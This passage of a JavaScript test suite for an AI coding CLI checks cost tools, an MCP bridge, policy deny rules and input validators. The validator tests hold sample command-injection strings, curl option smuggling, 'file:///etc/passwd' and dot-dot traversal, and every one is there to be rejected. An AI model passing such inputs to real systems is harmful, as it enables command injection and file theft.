    ok("agent view bar never exceeds the width", A.viewBar(agents[1], 1, 3, 34, null, now).every((r) => r.length <= 34));
    ok("view never crashes on a bare agent", Array.isArray(A.viewRows({ task: "x", status: "run", start: now }, 40, 12, 99, null, now)));
  }

  group("prompt-cache warmth (/warm + status chip)");
  {
    const W = require("../lib/cli/cachewarm");
    const now = 1e9, pr = { cr: 0.5, cw5: 6.25, cw1h: 10 };
    eq("1h writes win the TTL vote", W.ttlFromWrites(10, 900, 0), W.TTL_1H);
    eq("5m writes win the TTL vote", W.ttlFromWrites(900, 10, 0), W.TTL_5M);
    eq("a pure cache read keeps the previous TTL", W.ttlFromWrites(0, 0, W.TTL_1H), W.TTL_1H);
    eq("no cache touch yet -> none", W.cacheState({ lastAt: 0, now }).state, "none");
    eq("fresh 5m cache is warm", W.cacheState({ lastAt: now - 60000, ttl: W.TTL_5M, now }).state, "warm");
    eq("last minute is cooling", W.cacheState({ lastAt: now - 250000, ttl: W.TTL_5M, now }).state, "cooling");
    eq("past the TTL is cold", W.cacheState({ lastAt: now - 400000, ttl: W.TTL_5M, now }).state, "cold");
    eq("long-cold hides the chip", W.chip(W.cacheState({ lastAt: now - 3600000, ttl: W.TTL_5M, now })), "");
    eq("1h TTL is still warm after 30m", W.cacheState({ lastAt: now - 1800000, ttl: W.TTL_1H, now }).state, "warm");
    eq("warm chip shows minutes left", W.chip(W.cacheState({ lastAt: now - 60000, ttl: W.TTL_5M, now })), "cache 4m");
    eq("cooling chip shows seconds", W.chip(W.cacheState({ lastAt: now - 250000, ttl: W.TTL_5M, now })), "cache 50s");
    eq("cold chip", W.chip(W.cacheState({ lastAt: now - 400000, ttl: W.TTL_5M, now })), "cache cold");
    const fc = W.followUpCost(1e6, pr, W.TTL_5M);
    ok("follow-up: re-read at cr, re-write at cw5", fc.warm === 0.5 && fc.cold === 6.25);
    eq("1h TTL re-writes at cw1h", W.followUpCost(1e6, pr, W.TTL_1H).cold, 10);
    const ex = W.explain({ engine: "claude", lastAt: now - 60000, ttl: W.TTL_5M, now, ctxTok: 42000, price: pr }).join("\n");
    ok("explainer shows warm, both prices and the ratio", /warm/.test(ex) && /\$0\.0210/.test(ex) && /\$0\.2625/.test(ex) && /13×/.test(ex));
    ok("cold explainer drops the hurry-up tip", !/tip:/.test(W.explain({ engine: "claude", lastAt: now - 400000, ttl: W.TTL_5M, now, ctxTok: 1000, price: pr }).join("\n")));
    ok("non-claude engines say it isn't tracked", /isn't|doesn't report/.test(W.explain({ engine: "ollama" })[0]));
  }

  group("token estimator (/tokens — price before attaching)");
  {
    const T = require("../lib/cli/tokcount");
    eq("estimates ~chars/4 tokens", T.estimateTokens(4000), 1000);
    eq("rounds up a partial token", T.estimateTokens(10), 3);
    ok("detects a NUL byte as binary", T.looksBinary(Buffer.from([65, 66, 0, 67])) && !T.looksBinary(Buffer.from("plain text")));
    ok("skip-dirs cover the usual noise", T.SKIP_DIRS.has("node_modules") && T.SKIP_DIRS.has(".git") && T.SKIP_DIRS.has(".nexus"));
    const entries = [{ path: "src/big.js", chars: 40000 }, { path: "README.md", chars: 8000 }, { path: "logo.png", chars: 1000, binary: true }, { path: "huge.bin", chars: 9e9, skipped: true }];
    const sm = T.summarize(entries, { in: 5, cr: 0.5 });
    eq("counts only real text files", sm.files, 2);
    eq("counts binary + skipped separately", sm.binary + sm.skipped, 2);
    eq("sums estimated tokens", sm.tokens, 12000);
    ok("prices the first send and a cached resend", Math.abs(sm.firstSend - 0.06) < 1e-9 && Math.abs(sm.cachedResend - 0.006) < 1e-9);
    ok("no cache rate → no cached-resend figure", T.summarize(entries, { in: 5, cr: null }).cachedResend === null);
    const rows = T.renderTokens(entries, { price: { in: 5, cr: 0.5 }, paid: true, model: "Opus", width: 80 });
    ok("header shows the ≈ total + binary skip", /≈12\.0k tokens across 2 files/.test(rows[0]) && /1 binary/.test(rows[0]));
    ok("ranks the heaviest file first with a share %", /src\/big\.js/.test(rows[1]) && /83%/.test(rows[1]));
    ok("shows first-turn and cached cost", rows.some((r) => /\$0\.06/.test(r) && /first turn/.test(r) && /while cached/.test(r)));
    ok("every row fits the width", rows.every((r) => r.replace(/\x1b\[[0-9;]*m/g, "").length <= 80));
    ok("a local engine says it's free", T.renderTokens(entries, { paid: false, width: 80 }).some((r) => /free/.test(r)));
    ok("warns when the attachment is large", T.renderTokens([{ path: "x", chars: 400000 }], { price: { in: 5 }, paid: true, width: 80 }).some((r) => /large/.test(r)));
    ok("empty match explains usage", /\/tokens/.test(T.renderTokens([], { width: 60 })[0]));
    ok("long paths are truncated keeping the end", (() => { const r = T.renderTokens([{ path: "a/very/deeply/nested/" + "x".repeat(90) + "/file.js", chars: 400 }], { price: { in: 5 }, paid: true, width: 60 }); return r.every((x) => x.replace(/\x1b\[[0-9;]*m/g, "").length <= 60) && r.some((x) => /file\.js/.test(x)); })());
  }

  group("cost ledger + advisor (/turns, /cheaper)");
  {
    const L = require("../lib/cli/ledger");
    const turns = [
      { inTok: 1200, outTok: 400, cost: 0.012, dt: 3, model: "opus", engine: "claude", label: "add a command", paid: true, cacheRead: 0 },
      { inTok: 800, outTok: 120, cost: 0.004, dt: 1, model: "opus", engine: "claude", label: "add a command", paid: true, cacheRead: 500 },
      { inTok: 40000, outTok: 1500, cost: 0.21, dt: 22, model: "opus", engine: "claude", label: "review the engine", paid: true, cacheRead: 0 },
    ];
    // ---- summarizeTurns ----
    const sm = L.summarizeTurns(turns);
    eq("sums input tokens", sm.inTok, 42000);
    eq("sums output tokens", sm.outTok, 2020);
    ok("sums cost", Math.abs(sm.cost - 0.226) < 1e-9);
    eq("sums cache reads", sm.cacheRead, 500);
    eq("flags the priciest turn", sm.topCostIdx, 2);
    eq("counts a verbatim repeat", sm.dupTurns, 1);
    eq("counts distinct repeated prompts", sm.dupPrompts, 1);
    eq("empty ledger summarizes to zero turns", L.summarizeTurns([]).turns, 0);
    eq("all-free session has no priciest turn", L.summarizeTurns([{ inTok: 9, outTok: 9, cost: 0, dt: 1, paid: false, label: "x" }]).topCostIdx, -1);
    // ---- renderTurns ----
    const rows = L.renderTurns(turns, { width: 80 });
    ok("header totals the session", /3 turns/.test(rows[0]) && /42\.0k/.test(rows[0]) && /\$0\.2260/.test(rows[0]));
    ok("lists each turn label", rows.some((r) => /add a command/.test(r)) && rows.some((r) => /review the engine/.test(r)));
    ok("marks the priciest turn with ▲", rows.some((r) => r.includes("▲") && /review the engine/.test(r)));
    ok("every row fits the width", rows.every((r) => r.replace(/\x1b\[[0-9;]*m/g, "").length <= 80));
    ok("empty ledger says so", /no turns yet/.test(L.renderTurns([], { width: 60 })[0]));
    ok("max caps the listed rows + notes earlier turns", (() => { const many = Array.from({ length: 20 }, (_, i) => ({ inTok: 1, outTok: 1, cost: 0.001, dt: 1, paid: true, label: "t" + i })); const r = L.renderTurns(many, { width: 80, max: 5 }); return r.filter((x) => /\dt\d|t\d+/.test(x)).length <= 7 && r.some((x) => /earlier turn/.test(x)); })());
    // ---- costAdvice: lossless only ----
    const tips = L.costAdvice(turns, { paid: true, cacheOn: false, effort: "high", engine: "claude", ctxPct: 62, autoCompact: false });
    const tagset = tips.map((t) => t.tag);
    ok("advises turning the exact-repeat cache on", tagset.includes("cache"));
    ok("notes the verbatim repeats", tagset.includes("dups"));
    ok("explains claude prompt-caching", tagset.includes("prompt-cache"));
    ok("flags effort as a QUALITY tradeoff (not auto)", tips.find((t) => t.tag === "effort") && /quality tradeoff/.test(tips.find((t) => t.tag === "effort").text) && /not auto-applied/.test(tips.find((t) => t.tag === "effort").text));
    ok("suggests /compact on a full context", tagset.includes("context"));
    ok("a local engine short-circuits to free", (() => { const r = L.costAdvice(turns, { paid: false }); return r.length === 1 && r[0].tag === "free"; })());
    ok("a tidy session says nothing to cut", (() => { const r = L.costAdvice([{ inTok: 50, outTok: 20, cost: 0.001, dt: 1, paid: true, label: "a" }], { paid: true, cacheOn: true, effort: "", engine: "claude", ctxPct: 10, autoCompact: true }); return r.some((t) => t.tag === "ok"); })());
    ok("renderAdvice frames the tips", (() => { const r = L.renderAdvice(turns, { paid: true, cacheOn: false, engine: "claude" }); return /cost advisor/.test(r[0]) && r.length > 1; })());
  }

  group("compaction condenser animation");
  {
    const CA = require("../lib/cli/compact-anim");
    const f0 = CA.squeezeBar(0, 21).plain, fEnd = CA.squeezeBar(CA.CYCLE_MS - 10, 21).plain;
    ok("the core ◆ sits dead center", f0[10] === "◆" && fEnd[10] === "◆");
    ok("jaws start at the edges", f0[0] === "▸" && f0[20] === "◂");
    ok("jaws close in on the core over the cycle", fEnd.indexOf("▸") > f0.indexOf("▸") && fEnd.indexOf("◂") < f0.indexOf("◂"));
    ok("folded-away cells become dots", /^·+▸/.test(fEnd));
    ok("the bar loops (frame at one full cycle == frame 0)", CA.squeezeBar(CA.CYCLE_MS, 21).plain === f0);
    ok("bar width is honored", CA.squeezeBar(700, 15).plain.length === 15);
    const rows = CA.compactRows({ now: 13000, start: 1000, tok: 1234, before: 48200, width: 80 });
    ok("title says Condensing conversation with elapsed + tokens + esc", /Condensing conversation/.test(rows[0]) && /12s/.test(rows[0]) && /1\.2k tokens/.test(rows[0]) && /esc to interrupt/.test(rows[0]));
    ok("bar row shows the context being folded", /48\.2k tokens → folding/.test(rows[1]));
    ok("rows stay within the width", rows.every((r) => r.length <= 80));
    ok("a narrow terminal still renders", CA.compactRows({ now: 5, start: 0, width: 24 }).every((r) => typeof r === "string"));
    ok("done marker is the closed frame + folded size", /^▸◆◂ condensed 48\.2k tokens/.test(CA.doneRow({ before: 48200 })));
    ok("done marker notes auto + the summary toggle", /auto-condensed/.test(CA.doneRow({ before: 1, auto: true })) && /ctrl\+o shows the summary/.test(CA.doneRow({ hasSummary: true })) && /hides/.test(CA.doneRow({ hasSummary: true, expanded: true })));
  }

  group("api-server input validation (shell-out routes reject injection)");
  {
    const { isValidHostname, isSafeUrl } = require("../lib/nexus/url-guard");
    ok("accepts a plain hostname", isValidHostname("example.com") && isValidHostname("sub.test.darknode.ai"));
    ok("rejects a domain with a command separator", !isValidHostname("x; id #") && !isValidHostname("x$(id)") && !isValidHostname("a|b"));
    ok("rejects whitespace / backticks / pipes in a domain", !isValidHostname("a b") && !isValidHostname("a`id`") && !isValidHostname(""));
    ok("rejects an over-long domain", !isValidHostname("a".repeat(254)));
    ok("accepts an http/https url", isSafeUrl("https://test.darknode.ai/x") && isSafeUrl("example.com"));
    ok("rejects a url with shell metacharacters", !isSafeUrl("http://x/$(id)") && !isSafeUrl("http://x;id") && !isSafeUrl("http://x`id`"));
    ok("rejects a non-http scheme", !isSafeUrl("file:///etc/passwd") && !isSafeUrl("javascript:alert(1)"));
    ok("rejects a leading-dash value (curl would treat it as an option, not a URL)", !isSafeUrl("-o/tmp/pwn") && !isSafeUrl("-K/etc/curlrc") && !isSafeUrl("-V"));
  }

  group("audit fixes — edit engine + policy normalisation");
  {
    const E = require("../lib/nexus/edit");
    eq("flexible edit on a tab-indented block keeps tabs", E.applyEditsFlexible("\tif (x) {\n\t\ty();\n\t}\n", [{ find: "if (x) {\n  y();\n}", replace: "if (x) {\n  z();\n}" }]).content, "\tif (x) {\n\t\tz();\n\t}\n");
    eq("flexible edit on a CRLF file keeps CRLF endings", E.applyEditsFlexible("a\r\nfoo();\r\nbar();\r\nz\r\n", [{ find: "foo();\nbar();", replace: "FOO();\nBAR();" }]).content, "a\r\nFOO();\r\nBAR();\r\nz\r\n");
    ok("replaceAll:\"false\" is not treated as true", E.applyEdits("x x", [{ find: "x", replace: "y", replaceAll: "false" }]).ok === false);
    ok("replaceAll:\"true\" still replaces every match", E.applyEdits("x x", [{ find: "x", replace: "y", replaceAll: "true" }]).content === "y y");
    const P = require("../lib/governance/policy");
    ok("hard-deny sees through ./ and // in protected paths", !!P.hitsHardDeny({ type: "write", path: ".nexus/./settings.json" }) && !!P.hitsHardDeny({ type: "write", path: ".nexus//audit.jsonl" }) && !!P.hitsHardDeny({ type: "edit", path: "x/../.nexus/settings.json" }));
    ok("the agent can't rewrite its own policy/permission files", !!P.hitsHardDeny({ type: "write", path: ".nexus/policy.json" }) && !!P.hitsHardDeny({ type: "edit", path: ".nexus/permissions.json" }));
    ok("ordinary files are untouched by the floor", !P.hitsHardDeny({ type: "write", path: "src/app.js" }));
  }

  group("path jail — canonical, symlink- and dot-dot-safe (NSAFE-020)");
  {
    const jroot = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "nx-jail-")));
    try {
      fs.mkdirSync(path.join(jroot, "sub"));
      fs.writeFileSync(path.join(jroot, "sub", "a.txt"), "x");
      ok("a file inside the root is inside", resolveInJail("sub/a.txt", jroot).inside === true);
      ok("the root itself is inside", resolveInJail(".", jroot).inside === true);
      eq("assertInJail returns the canonical absolute path", assertInJail("sub/a.txt", jroot), path.join(jroot, "sub", "a.txt"));
      ok("a dot-dot traversal escapes", resolveInJail("../../etc/passwd", jroot).inside === false);
      ok("an absolute path outside the root is rejected", resolveInJail("/etc", jroot).inside === false);
      ok("assertInJail throws on an escape", (() => { try { assertInJail("../x", jroot); return false; } catch (e) { return /escapes the project directory/.test(e.message); } })());
      ok("a new (non-existent) file inside the root is allowed for write", resolveInJail("sub/new/deep.txt", jroot).inside === true);
      ok("a NUL byte is refused", (() => { try { resolveInJail("a\u0000b", jroot); return false; } catch (_) { return true; } })());
      ok("an over-long path is refused", (() => { try { resolveInJail("a".repeat(5000), jroot); return false; } catch (_) { return true; } })());
      // a symlink inside the root pointing outside is caught — string checks miss this
      let symRan = false;
      try {
        const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "nx-out-")));
        fs.writeFileSync(path.join(outside, "secret.txt"), "s");
        fs.symlinkSync(outside, path.join(jroot, "link"));
        symRan = true;
        ok("a symlink escaping the root resolves outside the jail", resolveInJail("link/secret.txt", jroot).inside === false);
        fs.rmSync(outside, { recursive: true, force: true });
      } catch (_) { /* symlinks may be unavailable (e.g. Windows without privilege) */ }
      if (!symRan) ok("symlink escape test skipped (symlinks unavailable)", process.platform === "win32");
    } finally { fs.rmSync(jroot, { recursive: true, force: true }); }
  }

  group("nexus engines — prototype-key / malformed-input safety (external fields)");
  {
    const ap = require("../lib/nexus/attack-planner");
    const rg = require("../lib/nexus/report-generator");
    const npx = require("../lib/nexus/nmap-parser");
    const noThrow = (fn) => { try { fn(); return true; } catch (_) { return false; } };
    // attack-planner: a service named "constructor" must not resolve the inherited Object fn
    ok("findServicePlaybook('constructor') -> null", ap.findServicePlaybook("constructor") === null);
    ok("suggestNextStep with a 'constructor' service does not crash", noThrow(() =>
      ap.suggestNextStep({ accessLevel: "none", vulnerabilities: [{ service: "constructor", confirmed: true, severity: "high" }] })));
    ok("suggestNextStep severity sort tolerates '__proto__' severity", noThrow(() =>
      ap.suggestNextStep({ accessLevel: "none", vulnerabilities: [{ service: "ssh", confirmed: true, severity: "__proto__" }, { service: "ftp", confirmed: true, severity: "high" }] })));
    // report-generator: a "constructor" severity must not poison the numeric risk score
    {
      const r = rg.calculateOverallRisk([{ severity: "constructor" }, { severity: "high" }]);
      ok("calculateOverallRisk yields a finite score for a reserved-word severity", !r || r.score == null || Number.isFinite(r.score));
    }
    // nmap-parser: a present-but-non-numeric timestamp attribute must not throw RangeError
    ok("parseNmapXML tolerates a non-numeric start/finish time", noThrow(() =>
      npx.parseNmapXML("<nmaprun start=\"x\" scanner=\"nmap\"><runstats><finished time=\"y\"/></runstats></nmaprun>")));
  }

  group("nexus docs — the reference the model reads on questions about Nexus");
  {
    const ND = require("../lib/cli/nexus-docs");
    const gen = require("../scripts/gen-nexus-docs.js");
    const names = new Set(["/warm", "/btw", "/agents", "/cost"]);
    ok("asks about a command → yes", ND.isNexusQuestion("what does /warm do?", names) && ND.isNexusQuestion("how do I use /btw", names));
    ok("asks about nexus / shortcuts → yes", ND.isNexusQuestion("how do I open an agent in nexus", names) && ND.isNexusQuestion("what keyboard shortcuts are there?", names));
    ok("ordinary coding prompts → no", !ND.isNexusQuestion("fix the bug in auth.js", names) && !ND.isNexusQuestion("why does this test fail?", names) && !ND.isNexusQuestion("add a /health route to the api", names));
    ok("running a command or an unknown /path → no", !ND.isNexusQuestion("/cost", names) && !ND.isNexusQuestion("what is in /etc/hosts?", names));
    const full = gen.generate();
    ok("docs/NEXUS-COMMANDS.md is up to date (run: node scripts/gen-nexus-docs.js)", fs.readFileSync(path.join(__dirname, "..", "docs", "NEXUS-COMMANDS.md"), "utf8") === full);
    const src = fs.readFileSync(path.join(__dirname, "..", "darknode.js"), "utf8");
    const menu = [...new Set((src.slice(src.indexOf("const CMDS = ["), src.indexOf("const HELP_SECTIONS")).match(/\["\/[a-z0-9:-]+"/g) || []).map((x) => x.slice(2, -1)))];
    ok("every menu command (" + menu.length + ") is in the reference", menu.length > 100 && menu.every((c) => full.includes("`" + c + "`")));
    ok("reference covers /btw keys and the agent view", /Ctrl\+Y copies the answer/.test(full) && /full conversation like the main chat/.test(full));
    const brief = ND.buildReference({ brief: true, cmds: [["/a", "x"]], help: [{ title: "H", rows: [["/a", "x"]] }], keys: [{ title: "K", rows: [["Esc", "stop"]] }], topics: { t: { title: "T", body: "b" } } });
    ok("brief copy drops the repeated /help groups + topic guides, keeps keys", !/Command groups|Topic guides/.test(brief) && /Keyboard shortcuts/.test(brief));
    const hits = ND.search(full, "copy answer");
    ok("/docs search finds lines with every word, under their heading", hits.length >= 2 && /^## /.test(hits[0]) && hits.slice(1).every((h) => /^## /.test(h) || /cop(y|ies)/i.test(h)));
    ok("forPrompt marks the reference as this-question-only", /Use it only for this question/.test(ND.forPrompt("x")));
  }

  group("settings store — saved extra keys + corrupt-file safety");
  {
    const NS = require("../lib/cli/nexus-settings");
    const h = fs.mkdtempSync(path.join(os.tmpdir(), "nxset-")); fs.mkdirSync(path.join(h, ".nexus"));
    fs.writeFileSync(path.join(h, ".nexus", "settings.json"), JSON.stringify({ aliases: { "/co": "/cost" } }));
    const st = NS.createStore(h, {});
    ok("getSaved reads a saved key outside DEFAULTS (aliases)", st.getSaved("aliases") && st.getSaved("aliases")["/co"] === "/cost" && st.corrupt === null);
    fs.writeFileSync(path.join(h, ".nexus", "settings.json"), "{ broken");
    const st2 = NS.createStore(h, {});
    const left = fs.readdirSync(path.join(h, ".nexus"));
    ok("a corrupt settings file is moved aside, not silently overwritten", !!st2.corrupt && left.some((f) => /^settings\.json\.corrupt-\d+$/.test(f)) && fs.readFileSync(st2.corrupt, "utf8") === "{ broken");
    st2.set("recap", false);
    ok("the next save writes a fresh file; the backup is untouched", JSON.parse(fs.readFileSync(path.join(h, ".nexus", "settings.json"), "utf8")).recap === false && fs.readFileSync(st2.corrupt, "utf8") === "{ broken");
    fs.writeFileSync(path.join(h, ".nexus", "settings.json"), "   ");
    ok("an empty settings file is just empty (no backup)", NS.createStore(h, {}).corrupt === null);
  }

  group("engine MCP bridge — external engines get the Nexus ask_user popup");
  {
    const { buildEngineMcpServers, writeMcpConfigFile, codexMcpArgs, toOpencodeConfig, writeEngineConfigFile } = require("../lib/nexus/engine-mcp");
    const { fmtAnswer, ASK_TOOL } = require("../lib/nexus/ask-mcp");
    const { createAskServer } = require("../lib/nexus/ask-bridge");
    const cp = require("child_process");

    // --- config builder ---
    const servers = buildEngineMcpServers({ sockPath: "/tmp/s.sock", askMcpPath: "/a/ask-mcp.js", nodePath: "/usr/bin/node", userServers: { github: { command: "npx", args: ["gh"] } } });
    ok("bridge always adds the 'nexus' ask server", servers.nexus && servers.nexus.command === "/usr/bin/node" && servers.nexus.args[0] === "/a/ask-mcp.js");
    ok("bridge passes the socket path via env", servers.nexus.env.NEXUS_ASK_SOCK === "/tmp/s.sock");
    ok("user-configured servers are forwarded too", servers.github && servers.github.command === "npx");
    ok("a malicious user 'nexus' override cannot shadow the bridge", buildEngineMcpServers({ sockPath: "/tmp/s.sock", askMcpPath: "/a.js", userServers: { nexus: { command: "evil" } } }).nexus.command !== "evil");
    ok("no bridge when sockPath is missing", !buildEngineMcpServers({ askMcpPath: "/a.js" }).nexus);

    const cfgDir = fs.mkdtempSync(path.join(os.tmpdir(), "nxmcpcfg-"));
    const cfgPath = writeMcpConfigFile(cfgDir, servers);
    ok("writeMcpConfigFile emits a { mcpServers } JSON file", cfgPath && JSON.parse(fs.readFileSync(cfgPath, "utf8")).mcpServers.nexus.command === "/usr/bin/node");

    // --- codex -c override translation ---
    const ca = codexMcpArgs("nexus", servers.nexus).join(" ");
    ok("codexMcpArgs sets command/args/env as -c overrides", /mcp_servers\.nexus\.command=/.test(ca) && /mcp_servers\.nexus\.args=/.test(ca) && /mcp_servers\.nexus\.env=/.test(ca));
    ok("codexMcpArgs returns nothing for a spec with no command", codexMcpArgs("x", {}).length === 0);
    ok("codex engine declares mcpInject + injects the server into its args", engineCap("codex", "mcpInject") && ENGINES.codex.mcpMode === "cArgs" && ENGINES.codex.args("P", { mcpServers: servers }).join(" ").includes("mcp_servers.nexus.command="));
    ok("non-MCP engines ignore mcpServers (no leakage)", !ENGINES.gemini.args("P", { mcpServers: servers }).join(" ").includes("mcp_servers"));

    // --- opencode: env-mode, merge into (not replace) the user's config ---
    ok("opencode declares env injection mode", engineCap("opencode", "mcpInject") && ENGINES.opencode.mcpMode === "env");
    const oc = toOpencodeConfig(servers, { model: "anthropic/x", mcp: { mine: { type: "local", command: ["keep"], enabled: true } } });
    ok("opencode config preserves the user's own settings + servers", oc.model === "anthropic/x" && oc.mcp.mine && oc.mcp.mine.command[0] === "keep");
    ok("opencode config adds nexus as a local server (command is [bin,...args])", oc.mcp.nexus.type === "local" && oc.mcp.nexus.command[1] === "/a/ask-mcp.js" && oc.mcp.nexus.enabled === true);
    ok("opencode config carries the socket under 'environment'", oc.mcp.nexus.environment.NEXUS_ASK_SOCK === "/tmp/s.sock");
    const ocPath = writeEngineConfigFile(cfgDir, "opencode.json", oc);
    ok("writeEngineConfigFile emits valid JSON", ocPath && JSON.parse(fs.readFileSync(ocPath, "utf8")).mcp.nexus.type === "local");

    // --- gemini: env-mode via the system-overrides settings file (gemini MERGES mcpServers, so only 'nexus' is added) ---
    ok("gemini declares env injection via GEMINI_CLI_SYSTEM_SETTINGS_PATH", engineCap("gemini", "mcpInject") && ENGINES.gemini.mcpMode === "env" && ENGINES.gemini.mcpEnvVar === "GEMINI_CLI_SYSTEM_SETTINGS_PATH" && ENGINES.gemini.mcpFormat === "mcpServers");
    const gmPath = writeEngineConfigFile(cfgDir, ".gemini-settings.json", { mcpServers: servers });
    const gm = JSON.parse(fs.readFileSync(gmPath, "utf8"));
    ok("gemini settings file carries mcpServers.nexus with the bridge socket", gm.mcpServers.nexus.command === "/usr/bin/node" && gm.mcpServers.nexus.env.NEXUS_ASK_SOCK === "/tmp/s.sock");
    ok("gemini settings file contains ONLY mcpServers (nothing to override user settings)", Object.keys(gm).length === 1 && gm.mcpServers);
    ok("gemini still gets no mcp flags leaked into its argv", !ENGINES.gemini.args("P", { mcpServers: servers }).join(" ").includes("mcp"));

    // --- MCP shim answer formatting (what the model reads back) ---
    ok("fmtAnswer: free-text", fmtAnswer({ answer: "yes do it" }) === "The user answered: yes do it");
    ok("fmtAnswer: single pick", fmtAnswer({ selected: "Option B", index: 1 }) === "The user chose: Option B");
    ok("fmtAnswer: multi pick", fmtAnswer({ selected: ["A", "C"], indices: [0, 2] }) === "The user selected: A, C");
    ok("fmtAnswer: dismissed/skip", /dismissed the question/.test(fmtAnswer({ skipped: true })) && /dismissed the question/.test(fmtAnswer(null)));
    ok("ask_user tool schema requires a question", ASK_TOOL.name === "ask_user" && ASK_TOOL.inputSchema.required.includes("question"));

    // --- real end-to-end: the stdio shim forwards a tools/call to the bridge and returns the user's answer ---
    await new Promise((resolve) => {
      const srv = createAskServer(async (req) => req.input ? { answer: "typed!" } : { selected: (req.options || [])[1], index: 1 });
      const shim = cp.spawn(process.execPath, [path.join(__dirname, "..", "lib", "nexus", "ask-mcp.js")], { env: Object.assign({}, process.env, { NEXUS_ASK_SOCK: srv.sockPath }), stdio: ["pipe", "pipe", "ignore"] });
      let out = "";
      shim.stdout.on("data", (d) => { out += d.toString(); });
      const send = (o) => shim.stdin.write(JSON.stringify(o) + "\n");
      send({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2024-11-05" } });
      send({ jsonrpc: "2.0", id: 2, method: "tools/list" });
      send({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "ask_user", arguments: { question: "Pick", options: ["x", "y", "z"] } } });
      setTimeout(() => {
        const byId = {}; for (const l of out.trim().split("\n").filter(Boolean)) { try { const m = JSON.parse(l); byId[m.id] = m; } catch (_) {} }
        ok("shim initialize → serverInfo name 'nexus'", byId[1] && byId[1].result.serverInfo.name === "nexus");
        ok("shim tools/list → ask_user", byId[2] && byId[2].result.tools[0].name === "ask_user");
        ok("shim tools/call → forwards to the bridge and returns the user's pick", byId[3] && /The user chose: y/.test(byId[3].result.content[0].text));
        try { shim.kill(); } catch (_) {} srv.close(); resolve();
      }, 800);
    });
  }

  group("/cheap v2 savers — repeat-line collapse + read-only call memo");
  {
    const CS = require("../lib/nexus/costsave");
    const L = "waiting for the database to accept connections";
    const r = CS.collapseRepeats(["start", L, L, L, L, L, "end"].join("\n"));
    eq("5 identical lines → 1 + exact count", r.text, ["start", L, "[previous line repeated 4 more times]", "end"].join("\n"));
    eq("never lengthens: short lines whose note would be longer stay", CS.collapseRepeats("a\nok\nok\nok\nok\nb").text, "a\nok\nok\nok\nok\nb");
    ok("reports tokens saved", r.saved > 0);
    eq("3 repeats are left alone (below the threshold)", CS.collapseRepeats("a\nx\nx\nx\nb").text, "a\nx\nx\nx\nb");
    eq("blank-line runs are left alone", CS.collapseRepeats("a\n\n\n\n\nb").text, "a\n\n\n\n\nb");
    const res = { stdout: "ok\n" + "warn: x\n".repeat(10), content: "same\nsame\nsame\nsame\nsame" };
    ok("collapseToolOutput shrinks command output", CS.collapseToolOutput(res) > 0 && /repeated 9 more/.test(res.stdout));
    eq("file contents are never collapsed (edits need exact text)", res.content, "same\nsame\nsame\nsame\nsame");
    const memo = CS.createToolMemo(), msgs = [], big = JSON.stringify({ hits: "x".repeat(300) });
    eq("first read-only call passes through", memo.lookup("search", { pattern: "foo" }, big, msgs), null);
    msgs.push({ role: "tool", content: big });
    ok("identical repeat → pointer", /identical to the earlier search/.test(memo.lookup("search", { pattern: "foo" }, big, msgs) || ""));
    eq("different args → no pointer", memo.lookup("search", { pattern: "bar" }, big, msgs), null);
    msgs.push({ role: "tool", content: big });
    memo.lookup("run_command", { command: "touch x" }, "{}", msgs); msgs.push({ role: "tool", content: "{}" });
    eq("a mutating tool in between invalidates the memo", memo.lookup("search", { pattern: "foo" }, big, msgs), null);
    msgs.push({ role: "tool", content: big });
    msgs[msgs.length - 1].content = "[superseded]";
    eq("earlier copy no longer in history → no pointer", memo.lookup("search", { pattern: "foo" }, big, msgs), null);
    const small = memo.lookup("list_dir", { path: "." }, "[]", msgs); msgs.push({ role: "tool", content: "[]" });
    eq("tiny results are never replaced", memo.lookup("list_dir", { path: "." }, "[]", msgs), null);
    void small;
  }

  group("read_symbol — one definition instead of the whole file");
  {
    const RS = require("../lib/nexus/read-symbol");
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "rsym-")), rp = (p) => path.resolve(dir, p);
    fs.writeFileSync(path.join(dir, "a.js"), [
      "const x = 1;",
      "// adds things",
      "function add(a, b) {",
      "  const re = /[{}]/g; // braces in a regex",
      "  const s = \"}\";",
      "  if (a) { return a + b; }",
      "  return b;",
      "}",
      "function other() { return 2; }",
    ].join("\n"));
    let r = RS.readSymbolTool({ path: "a.js", name: "add" }, dir, rp);
    eq("JS: doc comment through closing brace (regex + string braces skipped)", r.lines, "2-8");
    ok("content is line-numbered", /^2  \/\/ adds things/.test(r.content) && /8  }$/.test(r.content));
    eq("one-line function", RS.readSymbolTool({ path: "a.js", name: "other" }, dir, rp).lines, "9-9");
    ok("unknown name suggests similar ones", /similar: add/.test(RS.readSymbolTool({ path: "a.js", name: "ad" }, dir, rp).error || ""));
    fs.writeFileSync(path.join(dir, "m.py"), "import os\n\n@cache\ndef load(p,\n         q):\n    x = 1\n\n    return x\n\ndef after():\n    pass\n");
    r = RS.readSymbolTool({ path: "m.py", name: "load" }, dir, rp);
    eq("Python: decorator + multi-line signature + body by indentation", r.lines, "3-8");
    ok("needs path and name", /needs \{path, name\}/.test(RS.readSymbolTool({ path: "a.js" }, dir, rp).error));
    fs.rmSync(dir, { recursive: true, force: true });
  }

  group("json_query — one value from a JSON/JSONC file");
  {
    const JQ = require("../lib/nexus/json-query");
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "jq-")), rp = (p) => path.resolve(dir, p);
    fs.writeFileSync(path.join(dir, "p.json"), JSON.stringify({ scripts: { test: "node t.js" }, deps: { "@a/b": "1.0.0", c: "2" }, items: [{ n: 1 }, { n: 2 }, { n: 3 }] }));
    fs.writeFileSync(path.join(dir, "ts.json"), '{\n  // comment\n  "compilerOptions": { "strict": true, /* x */ "url": "http://a//b", },\n}\n');
    const q = (f, query, extra) => JQ.jsonQueryTool(Object.assign({ path: f, query }, extra || {}), dir, rp);
    eq("dotted path", q("p.json", "scripts.test").value, '"node t.js"');
    eq("bracket key with @ and /", q("p.json", 'deps["@a/b"]').value, '"1.0.0"');
    eq("negative index = from the end", q("p.json", "items[-1].n").value, "3");
    eq("* maps over elements", JSON.parse(q("p.json", "items.*.n").value), [1, 2, 3]);
    eq("keys_only lists keys", q("p.json", "deps", { keys_only: true }).keys, ["@a/b", "c"]);
    ok("missing key lists the keys that exist", /keys there: scripts, deps, items/.test(q("p.json", "nope").error));
